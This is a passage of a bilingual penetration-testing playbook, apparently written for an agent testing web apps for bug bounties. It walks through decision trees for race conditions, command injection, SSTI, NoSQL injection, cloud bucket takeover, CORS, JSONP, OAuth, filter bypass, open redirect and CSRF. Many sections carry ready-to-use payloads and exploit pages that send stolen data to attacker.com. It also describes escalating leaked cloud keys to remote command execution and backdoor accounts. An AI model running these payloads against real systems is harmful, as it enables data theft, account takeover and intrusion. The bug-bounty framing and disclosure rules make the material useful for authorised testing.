  Step3: 再看密码重置 → email替换/跳步/Token泄露  ← 高危
  Step4: 再看Session/凭证 → 混淆/MVC绑定/直发  ← 高危
  Step5: 顺便枚举 → 响应差异找有效账号  ← 辅助
```

## §10 逻辑缺陷
### 决策流程
```
识别status/step/phase/isPaid → 跳步测试 Step1→Step3
  → 重放测试 同请求发2次 → 并发测试 5-10次 → 回退测试 完成→取消→重做
```
### ⚠️ 利用闭环确认（MANDATORY — 在评级之前，防止空利用当漏洞）
```
发现疑似逻辑缺陷（跳步/绕过/未授权操作）?
├── 利用这个发现，你能做到什么以前做不到的事?
│   ├── 能读取到新的敏感数据（之前看不到的）? → 继续评级
│   ├── 能操作其他用户的资源/数据? → 继续评级
│   ├── 能提升自己的权限? → 继续评级
│   └── 只能创建空资源 / 获取空列表 / 页面看不到创建结果 / 无法继续利用
│       → 标记 NO_IMPACT，不入报告，仅记录到 findings 作为观察项
│       例: createChat 无认证创建空对话但页面看不到→NO_IMPACT
│       例: GET /api/list 返回空数组→NO_IMPACT
│       例: 方法绕过返回角色名"教师"→数据敏感度极低→NO_IMPACT
└── 判断标准: 必须有具体的、可演示的危害结果
    不是 "接口存在" 就算漏洞
    是 "实际读到了不该读的数据 / 实际执行了不该做的操作" 才算
```
### 高危模式
- 审批跳步、签到重放、退款后状态未更新、取消后券未退、密码重置最后一步未校验token归属

## §11 RCE/命令注入
### 识别信号
- `cmd command exec shell ping host ip domain`
### 决策流程
```
注入分隔符 ; | & && ` $() → 有回显/DNSLOG=RCE ✅
```
### Payload
```
分隔符: ; id | id || id & id && id `id` $(id)
DNSLOG: ; curl xxxx.dnslog.cn  ; ping -c 1 xxxx.dnslog.cn
延时: ; sleep 5
```

## §12 并发竞争
### 识别信号
- 限量操作(领券/秒杀/签到/抽奖) 重复操作(支付回调/注册/退款) 资源操作(余额/积分)

### 两种并发模式（场景不同，手法不同）
```
模式A — 同一请求并发(不换参数):
   场景: 一张券/一个活动/一次签到 → 多发10次
   判断: 发10次 → 成功收到10次奖励 → 竞争存在 ✅
   手法: Burp Intruder 或 Python threading 多发10个相同请求

模式B — 不同参数并发(换参数):
   场景: 先领券→再用券核销(两个请求必须同时到)
   判断: 同时提交 → 多次核销成功 → 竞争存在 ✅
   手法: 第一步领券请求 + 第二步核销请求 → 同时发送
```

### 流程
```
发现限量/重复/资源操作接口?
├── 优惠券类:
│   ├── 一张券同时核销5次 → 全部成功? → 竞争可用 ✅
│   ├── 同一优惠码重复兑换 → 多次成功? → 竞争可用 ✅
│   ├── 领优惠券多发10次 → 成功10张? → 竞争可用 ✅
│   └── 取消订单+优惠券退回 → 同时再领 → 券不退回但还能领
│
├── 秒杀/抢购类:
│   ├── 同账号多发 → 多次下单成功? → 竞争可用 ✅
│   └── 库存扣减 → 多发 → 库存扣负数? → 竞争可用 ✅
│
├── 支付/退款类:
│   ├── 支付回调多发 → 多次到账? → 竞争可用 ✅  ← 高危
│   ├── 退款多发 → 退N次金额? → 竞争可用 ✅  ← 高危
│   └── 取消订单并发 → 取消失败但你又付了? → 竞争可用 ✅
│
├── 社交/操作类:
│   ├── 点赞多发 → 多次计分? → 竞争可用 ✅
│   ├── 抽奖多发 → 多次扣次数+多次中奖? → 竞争可用 ✅
│   └── 注册多发 → 重复注册同账号? → 竞争可用 ✅
│
└── 通用并发5-10次 → 多次生效=竞争 ✅ | 仅1次→换场景再测
```

### 并发+支付组合（高危场景 — 面试/实战高频）
```
场景: 支付接口没有做幂等性校验
测试: 支付回调接口多发 → 每个回调都到账
原因: 后端只判断"已收到支付回调"不判断"该订单已被处理过"
```

## §13 通用参数Fuzz
### 使用场景
所有参数在进入专项决策树（SQLi/IDOR/XSS等）之前，先跑一轮通用变异基线，快速发现异常行为。

### 关联
- **若当前是查询/列表/搜索接口** → 跑完本§基线变异后 → 进 §23 泛查询/筛选绕过深度覆盖

| 维度 | 操作 | 观察 |
|------|------|------|
| 空值 | 不传/空串 | 报错信息 |
| 类型混淆 | 数字变字符/字符变数组 | 行为差异 |
| 重复键 | ?id=1&id=2 | 取值规则 |
| 边界 | 0 -1 最大整数 超长 | 溢出/截断 |
| 特殊符 | '";\<>{}[]()%00 | 注入点 |
| 方法差异 | GET/POST/PUT/DELETE | 鉴权差异 |

## §14 SSTI
### 识别信号
- 模板输出（用户信息/邮件/报告/错误页）
### 决策流程
```
注入${7*7} {{7*7}} #{7*7} → 返回49=SSTI✅
Java: ${T(java.lang.Runtime).getRuntime().exec('id')}
Python: {{config.__class__.__init__.__globals__}}
```

## §15 NoSQL注入
### 识别信号
- MongoDB+Express栈, JSON入参含`$`
### 决策流程
```
{"username":{"$ne":"","$gt":""}} → 绕过登录=NoSQL✅
{"$where":"this.password.length>0"} ?id[$regex]=^a
```

## §16 Prototype Pollution
### 识别信号
- Node.js+Express, JSON merge/assign/clone操作
### 决策流程
```
{"__proto__":{"isAdmin":true}} → 后续isAdmin=true=PP✅
{"constructor":{"prototype":{"polluted":"value"}}}
```

## §17 反序列化
### 识别信号
- Java: AC ED 00 05  PHP: a:1:{s:4:"test"  Python: pickle/yaml
### 流程
```
确定格式 → Java:ysoserial CommonsCollections1 | PHP:__PHP_Incomplete_Class | Python:pickle.loads
```

## §18 API数据联动
### 核心
```
接口A响应字段 → 输入到接口B/C/D请求参数
userId → /api/user/info?userId=  orderId → /api/order/detail?orderId=
token → Auth头  teamId → /api/team/members?teamId=
```
### 流程
```
每获响应→提取ID字段→匹配已知接口→替换值测越权→记录联动表
```
### 常见链
```
链1: 登录→{userId,token} → 用token访问他人userId=IDOR | 解码JWT改role
链2: 列表→{orderId} → 遍历其他orderId测可枚举
链3: 详情→{fileUrl,ownerId} → 下载/删除他人文件

关联: SKILL.md §3 Response Chaining (core principle) — 两条互补阅读
```

## §19 OSS/Bucket Analysis — Full Attack Chain

### 识别信号
- URL contains: `aliyuncs.com`, `amazonaws.com`, `myqcloud.com`, `qiniucdn.com`, `storage.googleapis.com`, `blob.core.windows.net`
- JS references: `bucket:`, `oss:`, `s3:`, `cos:`, `cdn.`
- Ping domain → resolves to cloud CNAME (e.g., `*.oss-cn-shanghai.aliyuncs.com`)
- Page shows: "AccessDenied", "NoSuchBucket", "BucketName" error XML/JSON
- API responses returning signed/pre-signed URLs

### Cloud Provider Mapping

| Provider | Storage Name | URL Pattern |
|----------|-------------|-------------|
| Alibaba Cloud | OSS | `*.oss-cn-*.aliyuncs.com` |
| AWS | S3 | `*.s3.amazonaws.com`, `*.s3-*.amazonaws.com` |
| Tencent Cloud | COS | `*.cos.ap-*.myqcloud.com` |
| Huawei Cloud | OBS | `*.obs.cn-*.myqcloud.com` |
| Google Cloud | GCS | `*.storage.googleapis.com` |
| Azure | Blob | `*.blob.core.windows.net` |
| Qiniu | Kodo | `*.qiniucdn.com` |

### 决策流程

```
OSS/Bucket detected?
├── STEP 1: Permission Test
│   ├── Public read? → Access file URL directly (no auth)
│   │   ├── File downloadable → check for sensitive content
│   │   └── AccessDenied XML → private bucket
│   ├── ListObject enabled? → GET bucket root URL
│   │   ├── Returns XML/JSON file list → directory enumeration ✅
│   │   │   → Tool: ossFileList.py (Alibaba), aws s3 ls --no-sign-request (AWS)
│   │   └── AccessDenied → listing disabled
│   └── Public write? → PUT a test file
│       ├── 200 OK → bucket takeover ✅ (upload HTML for phishing if domain-bound)
│       └── 403 → write disabled
│
├── STEP 2: Domain Binding Check
│   ├── Target domain → ping → resolves to cloud CNAME?
│   │   ├── YES + AccessDenied → bucket exists but private
│   │   ├── YES + NoSuchBucket → BUCKET DELETED, DOMAIN BINDING REMAINS → hijack ✅
│   │   │   → Extract bucket name + region from CNAME → create bucket with same name+region
│   │   │   → Bucket names are globally unique per region
│   │   └── YES + HTML page renders → bound domain with public bucket → phishing vector
│   └── Upload HTML file → test via bound domain URL
│       ├── File downloads (not rendered) → no domain binding / wrong endpoint
│       └── HTML renders → domain binding active → phishing/credential harvesting ✅
│
├── STEP 3: Signed URL Deep Analysis
│   ├── Expires too long? → Replay old URL → bypass time-limited access
│   ├── Signature algorithm exposed in JS? → Extract signing key → forge unlimited URLs
│   ├── Path traversal in URL? → Modify path while keeping signature → access other files
│   └── Remove signature entirely → test no-auth access
│
└── STEP 4: AK/SK Escalation (if keys found in Phase 1/5)
    ├── Identify cloud provider from key format (see table below)
    ├── Validate keys → test list-buckets / get-caller-identity
    ├── Storage access → list/download/upload bucket files
    └── ESCALATE to RCE (if IAM permissions allow)
        ├── Alibaba: OSS browser → check ECS console access → run command
        ├── AWS: S3 browser → check SSM + EC2 → Systems Manager RunCommand
        ├── Tencent: COS browser → check CVM + Tat → Automation Assistant
        └── Huawei: OBS browser → check ECS → (limited: no direct RCE API)
```

### Payload — Bucket Testing

```
Bucket naming patterns to test:
  {company}-assets  {company}-uploads  {company}-backup  {company}-dev
  {app}-production  {app}-staging  {app}-development
  {company}-public  {company}-static  {company}-cdn
  {company}-logs    {company}-files   {company}-data

Common sensitive files:
  .env  backup.zip  database.sql  config.json  credentials.csv
  *.pem  *.p12  id_rsa  known_hosts  accesskey*.txt

NoSuchBucket takeover:
  1. ping subdomain → reveals CNAME (e.g., ztk.oss-cn-shanghai.aliyuncs.com)
  2. Extract: bucket_name=ztk, region=oss-cn-shanghai
  3. Create bucket with same name + same region in your own cloud account
  4. Upload proof HTML → verify takeover via original subdomain
```

### Payload — AK/SK Exploitation

```
AK/SK Format Recognition:
  Alibaba: AKID = LTAI... (24 chars) | SK = 30 chars
  AWS:     AKID = AKIA... (20 chars) | SK = 40 chars
  Tencent: AKID = AKID... (36 chars) | SK = 32 chars
  Huawei:  AKID = VM... (20 chars)   | SK = 40 chars
  Qiniu:   AK = random (variable)    | SK = random (variable)

AK/SK Leak Sources (search priority):
  1. JS files: grep for "accessKeyId\|secretAccessKey\|access_key\|secret_key"
  2. Heapdump: Spring Actuator /heapdump → extract → grep for keys
  3. Nacos config: /nacos/v1/cs/configs → search for AK/SK in config
  4. Mini-program source: decompile .wxapkg → search for cloud SDK init
  5. GitHub/Gitee: search "LTAI" OR "AKIA" OR "AKID" + company/domain
  6. API error responses: invalid params may leak AK in error messages
  7. Image/upload endpoints: response may contain AK/SK for direct upload

After obtaining AK/SK:
  1. Validate: use cloud CLI/SDK to call get-caller-identity
  2. If storage permission → list/download/upload buckets
  3. If ECS/EC2/CVM permission → enumerate instances → attempt command execution
  4. If IAM/RAM admin → create backdoor account or escalate permissions
```

---

*精简版 — 保留决策流程+Payload，移除冗余描述。~520行*

## §20 CORS Misconfiguration

### 识别信号
- API response contains sensitive data (user info, tokens, private content)
- Response headers include: `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`

### 决策流程
```
Response contains sensitive data?
├── YES → Add Origin header: Origin: https://evil.com → resend
│   ├── Response: Access-Control-Allow-Origin: https://evil.com
│   │   + Access-Control-Allow-Credentials: true → CRITICAL CORS ✅
│   ├── Response: Access-Control-Allow-Origin: null
│   │   + Access-Control-Allow-Credentials: true → CRITICAL (exploitable via sandboxed iframe) ✅
│   ├── Response: Access-Control-Allow-Origin: Null (capital N)
│   │   + Access-Control-Allow-Credentials: true → NOT exploitable ❌
│   ├── Response: Access-Control-Allow-Origin: *
│   │   + Access-Control-Allow-Credentials: true → NOT_VULN (W3C标准: credentials为true时origin不能是*,
│   │   浏览器直接拦截,无法跨域读取) ⚠️
│   ├── Response: Access-Control-Allow-Origin: *
│   │   (no credentials header) → NOT_VULN (公开数据,无需鉴权,无危害) ⚠️
│   └── No CORS headers → NOT vulnerable ❌
└── NO → Check for JSONP instead (§21)
```

### Payload
```
Test origins to try:
Origin: https://evil.com
Origin: https://target.com.evil.com  (suffix match bypass)
Origin: https://evil.target.com      (prefix match bypass)
Origin: null
Origin: https://target.com           (same-origin to check reflection)

CORS 3-part test:
1. Does server reflect arbitrary Origin? → Origin: https://evil.com
2. Is Access-Control-Allow-Credentials: true?
3. Can you exploit from a browser? → host HTML on evil.com → fetch with credentials: 'include'
```

### Null Origin Exploit (for null+Credentials:true)
```html
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    fetch('https://target.com/api/data', {credentials: 'include'})
    .then(r => r.text())
    .then(d => fetch('https://attacker.com/?c=' + btoa(d)));
  </script>
"></iframe>
```

### Full CORS Exploit PoC (Credentials + 未授权接口组合 — 通用模板)
```html
<!-- 部署在攻击者控制的网站上 -->
<!-- 当受害者访问此页面时，自动窃取目标系统数据 -->
<html><body><script>
// Step 1: 窃取目标系统的业务数据（替换 {ENDPOINT}/{PARAMS} 为实际值）
fetch('https://{TARGET}/{API_PREFIX}/{ENDPOINT}', {
  method: '{HTTP_METHOD}',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: JSON.stringify({ {PARAM_NAME}: '{PARAM_VALUE}' })
}).then(r => r.json()).then(data => {
  // Step 2: 将窃取的数据通过Image beacon外传到攻击者服务器
  // (Image不会触发CORS预检，是静默数据外传的最佳方式)
  new Image().src = 'https://attacker.com/collect?data=' + btoa(JSON.stringify(data));
});

// Step 3: 如果有Credentials且Token可重用，窃取所有需要认证的接口
fetch('https://{TARGET}/{API_PREFIX}/{LIST_ENDPOINT}', {
  method: '{HTTP_METHOD}',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: JSON.stringify({pageNum:1, pageSize:100})
}).then(r => r.json()).then(data => {
  // 外传泄露的数据量
  new Image().src = 'https://attacker.com/collect?d=' + btoa(JSON.stringify(data));
});
</script></body></html>
```

**三要素确认（一条curl验证）**：
```bash
curl -sk "https://target.com/api/endpoint" \
  -X POST -H "Content-Type: application/json" \
  -H "Origin: https://evil.com" \
  -d '{}' -D - 2>&1 | grep -i access-control
# 必须同时满足:
#   Access-Control-Allow-Origin: https://evil.com (或 *)
#   Access-Control-Allow-Credentials: true
# 两者同时满足 = 可跨域窃取（严重）
```

## §21 JSONP Hijacking

### 识别信号
- API endpoint with `callback=`, `jsonp=`, `cb=`, `jsoncallback=` parameter
- Response body is JavaScript function call: `callbackName({...})`
- No CSRF token or Referer check on the endpoint

### 决策流程
```
Found callback parameter in API?
├── YES → Test: add ?callback=test → response is test({...data...})?
│   ├── YES + response contains sensitive data → JSONP hijackable ✅
│   │   └── Build exploit page with same callback function → steal data cross-origin
│   ├── YES + requires auth token in URL → check if token is CSRF-protected
│   └── NO → not JSONP, check CORS instead (§20)
└── NO → Search JS for: callback, jsonp, jsoncallback
```

### Payload

```
Callback param names to test:
?callback=test  ?jsonp=test  ?cb=test  ?jsoncallback=test
?callback=test  ?call=test  ?jsonpcallback=test

Exploit template:
<script>
function stealData(data) {
  fetch('https://attacker.com/save', {
    method: 'POST', body: JSON.stringify(data)
  });
}
</script>
<script src="https://target.com/api/data?callback=stealData"></script>
```

---

## §22 OAuth/SSO Authorization Attacks

### 识别信号
- Login via third-party (WeChat/QQ/GitHub/Google/Apple) — `/oauth/authorize`, `/connect/qrconnect`, `/sso/login`
- URL params: `client_id`, `redirect_uri`, `response_type=code`, `scope`, `state`
- OAuth callback endpoint: `/callback`, `/afterauth`, `/oauth/callback`
- SSO token in response: `access_token=`, `id_token=`

### 决策流程
```
OAuth/SSO detected?
├── Step1: State parameter check (CSRF)
│   ├── Missing state param → CRITICAL CSRF ✅
│   │   → Attacker initiates OAuth → gets own code → forces victim to use attacker's code
│   │   → Victim logs in but uses attacker's account → attacker can access victim's actions
│   └── State present → check if validated server-side
│
├── Step2: redirect_uri validation
│   ├── Full redirect_uri accepted (no whitelist) → CRITICAL code interception ✅
│   │   → redirect_uri=https://evil.com → code sent to attacker
│   ├── Partial match bypass:
│   │   → redirect_uri=https://target.com.evil.com (suffix bypass)
│   │   → redirect_uri=https://target.com/callback?next=https://evil.com (open redirect chain)
│   │   → redirect_uri=https://target.com@evil.com (@ bypass)
│   └── Strict whitelist → move to Step3
│
├── Step3: Code/Token reuse & interception
│   ├── Authorization code reused? → exchange same code twice → both succeed?
│   ├── Code not bound to client_id? → get code for client_A → redeem with client_B secret
│   ├── Implicit flow: access_token in URL fragment (#access_token=...)
│   │   → redirect_uri with open redirect → token leaks to attacker
│   └── PKCE missing? → code can be intercepted + used by any client
│
├── Step4: Forced profile linking (CSRF + no confirmation)
│   ├── Bind social account without re-authentication?
│   │   → GET /oauth/linking?code=ATTACKER_CODE → CSRF → bind attacker's social account
│   │   → Attacker can now login via social account → account takeover
│   └── Bind without explicit user consent?
│       → QR code → victim scans → automatically bound → CSRF account takeover
│
└── Step5: Post-login token reuse (mini-program/web crossover)
    ├── Get mini-program token → use on web → same permissions? higher?
    ├── Get web session/token → use on mini-program API → bypass auth?
    └── Different OAuth providers → same user → session merge issues?
```

### Payload
```
redirect_uri bypass patterns:
  https://evil.com                                        (full control)
  https://target.com.evil.com                             (suffix match)
  https://evil.com/target.com                             (prefix match)
  https://target.com/callback?redirect=https://evil.com   (open redirect chain)
  https://target.com@evil.com                             (@ bypass)
  https://target.com%00.evil.com                          (null byte)

Implicit flow token theft:
  If open redirect exists on callback page:
    https://target.com/callback?next=https://evil.com#access_token=TOKEN
    → Browser follows redirect WITH fragment → evil.com gets token

Missing state CSRF exploit:
  <iframe src="https://provider.com/oauth/authorize?client_id=CLIENT
    &redirect_uri=CALLBACK&response_type=code&scope=profile">
  → Victim loads iframe → authorized → code sent to CALLBACK
  → Attacker uses code → logs into victim's account on attacker's device
```

### 快速判断速查

```
❌ No state param + no CSRF protection on callback → CRITICAL
❌ redirect_uri not validated → CRITICAL (code theft)
⚠️ state present but not verified server-side → HIGH (CSRF still possible)
⚠️ PKCE not enforced → HIGH (code interception)
⚠️ No re-auth for social account binding → HIGH (forced linking)
⚠️ Implicit flow + open redirect → HIGH (access_token leak)
```

---

## §23 泛查询 / Filter Bypass（筛选条件绕过）

### 核心成因
查询接口后端未对筛选/限定参数做严格判空和鉴权兜底，导致参数边界失控，特殊值绕过 WHERE 条件后返回超出当前用户权限的全量数据。本质：**后端查询条件未做严格校验 → 参数边界失控 → 返回越权数据**。

### 挖掘入口
优先定位以下三类接口（天然依赖查询条件）：
- **列表/搜索接口**: `/api/order/list` `/api/ticket/search` `/api/knowledge/query` `/api/resource/page`
- **导出接口**: `/api/export/users` `/api/report/export` `/api/download/csv`
- **带限定参数接口**: 任何含 `categoryId` `tenantId` `groupId` `ownerId` `caseAccountId` `knowledge_lib_id` `buyerId` `creatorId` `projectId` `deptId` `orgId` `memberId` 等过滤字段的请求

### 13 种变异手法（从轻到重：改值 → 清空 → 删结构）

```
第一轮 P0 — 参数值变异（最轻量，不改参数结构，只改值）：
┌──────────────────────────────────────────────────────────────┐
│ ① 置0 (Set to 0)                                            │
│   id=0  /  userId=0  /  categoryId=0                         │
│   部分 ORM 对 id=0 匹配所有记录或跳过校验                      │
│   示例: /api/resource/list?ownerId=0 → 返回非当前用户的资源     │
│                                                              │
│ ② 置1扩散 (Set to 1 spread)                                  │
│   type=1  /  status=1  /  category=1                         │
│   命中最大范围的分类或状态，超出当前用户的限定范围               │
│   示例: 用户只能查type=2(自己的) → 改type=1 → 管理员级别的全量   │
│                                                              │
│ ③ 通配符模糊匹配 (Wildcard LIKE bypass)                       │
│   keyword=%  /  keyword=*  /  keyword=_                      │
│   后端直接拼成 WHERE name LIKE '%keyword%' → %命中所有记录     │
│   * 和 _ 作为 SQL 通配符直接绕过匹配逻辑                       │
│   Multi-byte: keyword=％ (全角百分号, 可能未被转义)            │
│                                                              │
│ ④ 负数 (Negative value)                                      │
│   id=-1  /  userId=-1  /  categoryId=-1                      │
│   绕过正整数校验逻辑，触发异常查询路径或返回特殊数据集           │
│   示例: WHERE id > 0 → id=-1 绕过 → 全表                       │
├──────────────────────────────────────────────────────────────┤
│ 第二轮 — 参数清空（参数仍存在但值为空）：                       │
│                                                              │
│ ⑤ 置空 (Empty value)                                         │
│   keyword=  /  name=  /  categoryId=                         │
│   后端可能拼成 WHERE name='' 或直接忽略该条件 → 全表返回       │
│   示例: /api/order/list?keyword= → WHERE keyword LIKE '%%'    │
├──────────────────────────────────────────────────────────────┤
│ 第三轮 — 参数结构删除（最重，改变请求结构）：                   │
│                                                              │
│ ⑥ 删参数 (Delete parameter)                                  │
│   直接不传该过滤字段 → 后端无此条件 → 查全量                    │
│   GET: 从 URL 删掉 &categoryId=xxx                            │
│   JSON: 从 body 删掉 "categoryId":"xxx" 整个键值对            │
├──────────────────────────────────────────────────────────────┤
│ 第四轮 P1 — 场景化扩展（针对特定参数类型的深度变异）：          │
│                                                              │
│ ⑦ 超大分页 (Large pagination)                                │
│   pageSize=9999  /  limit=99999  /  size=999999              │
│   服务端未限制单页最大条数，一次性拉取全量数据                   │
│   配合 page=1 → 直接导出全表                                   │
│                                                              │
│ ⑧ page 置0或负数 (page=0 / page=-1)                          │
│   page=0  /  page=-1  /  offset=-1                           │
│   部分框架 page=0 返回全部，page=-1 返回第一页之前的数据        │
│   ORM 分页计算: LIMIT offset, size → offset=-1 可能绕过        │
│                                                              │
│ ⑨ 数组注入 (Array injection)                                 │
│   id[]=1&id[]=2&id[]=3  /  ids=1,2,3,4,5...999              │
│   批量查询接口未限制 ID 数量 → 枚举他人 ID 拉到他人数据         │
│   JSON: {"ids": [1,2,3,...,1000]} → 批量越权拉取              │
│                                                              │
│ ⑩ 类型混淆 (Type confusion)                                  │
│   id=a  /  id=null  /  id=undefined  /  id=true              │
│   整型字段传字符串/布尔/null → 类型转换 → 查询条件失效          │
│   示例: WHERE id='a' → 隐式转换为0 → 返回 id=0 的数据或全表    │
│   JSON: 整型字段传 true/false/null → 反序列化异常 → 跳过条件   │
│                                                              │
│ ⑪ 时间范围扩大 (Time range expansion)                         │
│   startTime=2000-01-01&endTime=2099-12-31                    │
│   startTime=1970-01-01&endTime=9999-12-31                    │
│   拉取全量历史数据，突破默认时间窗口限制（如仅本月/本季度）      │
│   也可: 删除 startTime/endTime 参数 → 后端不加时间条件         │
│                                                              │
│ ⑫ 排序字段注入 (Order-by field injection)                     │
│   orderBy=id → orderBy=salary / orderBy=password / ...       │
│   排序字段名可控 → 间接泄露敏感字段值的排序规律和分布           │
│   延伸: orderBy=CASE WHEN ... THEN ... END → SQL注入          │
│                                                              │
│ ⑬ 响应字段扩展 (Response field expansion)                     │
│   fields=*  /  select=all  /  fields=id,name,phone,password  │
│   部分接口支持自定义返回字段 → 拉取未授权的敏感字段             │
│   GraphQL: { users { id name phone ssn } } → 越权字段         │
└──────────────────────────────────────────────────────────────┘
```

### 决策流程
```
发现列表/搜索/导出接口
  ↓
Step 1: 记录基线
  正常请求 → 记录 response_length + total/count + 数据内容特征
  ↓
Step 2: 逐个参数变异 + 每轮变异后立即对比基线（不批量，一步一观察）：
  For each 限定条件参数:
    按顺序: 置0 → 置1 → % → -1 → 置空 → 删参数
      ↓ (每次变异后立即发请求对比基线)
      观察: 响应体长度变大? total/count跳变? 出现他人数据?
        → YES: 该参数+该变异值触发泛查询 ✅ → 记录 → 继续测下一个参数
        → NO:  继续下一个变异值
  ↓
Step 3: P1 深度覆盖（P0 轮如已命中，P1 用于扩大战果）
  超大分页 → page=0/-1 → 数组注入 → 类型混淆 → 时间范围 → 排序字段 → 响应字段
  （同样每变异一次立即对比基线，非批量）
  ↓
Step 4: 人工确认
  对比响应内容 → 确认是否确实返回了越权数据 → 记录触发参数+变异值
```

### 测试位置全覆盖
```
URL Query:     GET /api/order/list?keyword=xxx&categoryId=xxx → 逐个变异
POST Form:     Content-Type: application/x-www-form-urlencoded → body参数变异
POST JSON:     {"query":{"filters":{"categoryId":"xxx"}}} → 逐层JSON key变异
Path Param:    /api/user/{userId}/orders → userId=0 / userId=-1 / userId=
Request Header: X-Tenant-Id / X-Group-Id / X-User-Id / X-Filter-* → 置空/删除
Cookie:        tenant=xxx; group=xxx → 拆分后逐个Cookie键值变异
GraphQL:       查询参数/筛选字段 → 删除where条件/扩大limit
```

### 参数变异速查字典
```
第一轮（改值，最轻量）:
  置0:     param=0
  置1:     param=1
  通配符:  param=% | param=* | param=_
  负数:    param=-1
第二轮（清空）:
  置空:    param=
第三轮（删结构，最重）:
  删参:    [REMOVE_KEY]

第四轮（场景化扩展）:
  大数:    pageSize=9999 | limit=99999 | size=999999
  page:    page=0 | page=-1 | offset=-1
  数组:    param[]=1&param[]=2 | ids=1,2,3
  混淆:    param=a | param=null | param=undefined | param=true
  时间:    startTime=2000-01-01&endTime=2099-12-31
  排序:    orderBy=salary | orderBy=password | sort=*
  字段:    fields=* | select=all | fields=id,name,phone
```

### 漏洞本质一句话总结
> 泛查询不是注入，是**授权边界在查询层面的塌陷**——后端用前端参数拼WHERE条件但未校验参数的有效性和归属，攻击者控制参数边界后查询范围越过了当前用户的权限边界。

### JWT ↔ 泛查询 闭环链路（MANDATORY）
```
泛查询泄露他人数据(userId/邮箱/手机号)
    ↓
提取的 userId → JWT爆破分支(§JWT Step 2) → 辅助字典
提取的 Secret/Key → JWT 自签 Token → 伪造任意用户身份
    ↓
用伪造的高权限 Token 回到泛查询接口
    ↓
更大范围的批量数据泄露 → 高危/严重

核心: 单点泛查询=中危, 泛查询→JWT→泛查询闭环=高危
```

### 关联漏洞
- 通用参数变异基线测试 → §13 通用参数Fuzz
- 若IDOR端点带筛选条件(ownerId/categoryId) → §1 IDOR
- 若接口本身无认证就返回全量 → §8 未授权访问
- JWT爆破/伪造 → `references/jwt-analysis.md` Step 2-3
- 源码泄露 → 数据联动链路 → SKILL.md Phase 0 Source Leak Search

### SRC合规
```
严重度:
  返回全站用户PII（手机/身份证/地址≥3敏感字段） → 高危/严重
  返回全站工单/订单（含他人业务数据） → 中危起步，涉及隐私=高危
  返回全站公开资源/列表（无敏感信息） → 低危/忽略
数据限制: 截图响应结构变化 + 前 ≤5 条数据样例即可，严禁批量导出
报告关键: 证明 "参数 X 从正常值变为 Y 后，数据范围突破当前用户权限"
```

---

## §24 Open Redirect

### 识别信号
- 参数：`redirect` `next` `return` `goto` `redirectUrl` `redirect_uri` `callback` `target` `continue` `back`
- 302/301 响应码 + `Location` 头指向参数指定的 URL
- 登录/退出/OAuth/支付回调页面（天然需要跳转的流程）

### 决策流程
```
发现重定向参数?
├── Step 1: 基础验证
│   → ?redirect=https://evil.com → 302 Location: https://evil.com → Open Redirect ✅
│   → ?redirect=//evil.com → 302 Location: //evil.com (协议相对URL) → ✅
│   → ?redirect=\evil.com → 302 Location: \evil.com (反斜杠, 部分浏览器解析为 //) → ✅
│
├── Step 2: 白名单绕过 (如果基础验证被拦)
│   → ?redirect=https://target.com.evil.com (后缀匹配绕过)
│   → ?redirect=https://evil.com/target.com (路径包含目标域)
│   → ?redirect=https://target.com@evil.com (@ 绕过)
│   → ?redirect=https://target.com%00.evil.com (空字节截断)
│   → ?redirect=https://evil.com%23target.com (# 截断)
│
├── Step 3: OAuth 场景升级
│   → Open Redirect + OAuth → redirect_uri 白名单绕过 → 劫持 authorization code → 账户接管
│   → 参照 §22 OAuth/SSO
│
└── Step 4: 危害评估
    → 钓鱼(phishing): 用户点击 target.com 链接 → 跳转到钓鱼页面 → 输入凭据
    → Token泄露: 302 跳转时浏览器携带 Referer → 第三方站点看到 token/session
    → OAuth升级: 结合 redirect_uri → 高危
    → 无OAuth结合、无token泄露 → 低危/中危 (取决于钓鱼可利用性)
```

### Payload
```
基础跳转测试:
  ?redirect=https://evil.com
  ?redirect=//evil.com
  ?redirect=\\evil.com
  ?redirect=https:evil.com

白名单绕过:
  ?redirect=https://target.com.evil.com
  ?redirect=https://evil.com#target.com
  ?redirect=https://evil.com?target.com
  ?redirect=https://target.com@evil.com
  ?redirect=javascript:alert(1)  (少数场景)
```

### SRC合规
```
严重度:
  Open Redirect + OAuth → redirect_uri bypass → 高危
  可窃取token/session的302跳转 → 中危
  纯钓鱼场景(用户需交互) → 低危
  无实际影响的跳转 → 忽略
```

---

## §25 CSRF

### 识别信号
- 状态变更请求(POST/PUT/DELETE)缺少不可预测 token
- 参数：无 `csrf` `_token` `xsrf` `authenticity_token` `nonce` 或仅有可预测的值
- Cookie: `SameSite=None` 或 `SameSite=Lax` + GET 敏感操作
- 跨域请求未验证 `Origin`/`Referer` 头

### 决策流程
```
发现状态变更端点(POST/PUT/DELETE)?
├── Step 1: Token 存在性检查
│   ├── 无 CSRF token → CSRF 可能存在 ✅
│   ├── 有 token → 删除 token 参数 → 请求仍成功? → CSRF ✅
│   └── 有 token → 置空 token= → 请求成功? → CSRF ✅
│
├── Step 2: Token 可预测性
│   → token=MD5(timestamp) → 可预测 → CSRF ✅
│   → token=固定值(每次相同) → 可重用 → CSRF ✅
│   → token 与其他用户共享 → CSRF ✅
│
├── Step 3: SameSite Cookie 检查
│   → Set-Cookie: SameSite=None + Secure → 可跨站携带 → CSRF 可触发
│   → Set-Cookie: SameSite=Lax → POST 受限, 但 GET 敏感操作仍可 CSRF
│   → Set-Cookie: SameSite=Strict → 基本防御 (仍需测 token 绕过)
│   → 无 SameSite 属性 → 现代浏览器默认 Lax → POST 有限保护
│
├── Step 4: Origin/Referer 校验
│   → 删除 Referer 头 → 请求成功? → 服务端未校验 → CSRF ✅
│   → Origin: https://evil.com → 请求成功? → 仅依赖 Origin 或校验不严 → CSRF ✅
│
└── Step 5: Content-Type 绕过
    → application/json → text/plain (绕过 CORS preflight)
    → 表单数据 → JSON (如果服务端接受多种类型)
```

### 高危 CSRF 场景
- 修改密码/邮箱/手机号 (账户接管链)
- 修改支付/提现账户
- 删除资源/订单
- 添加管理员/权限
- OAuth 绑定第三方账号
- 转账/支付确认

### Payload
```
HTML PoC 模板:
<html>
  <body>
    <form action="https://target.com/api/update-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
      <input type="submit" value="Click me">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>

JSON CSRF (需要 fetch + text/plain 绕过 preflight):
<script>
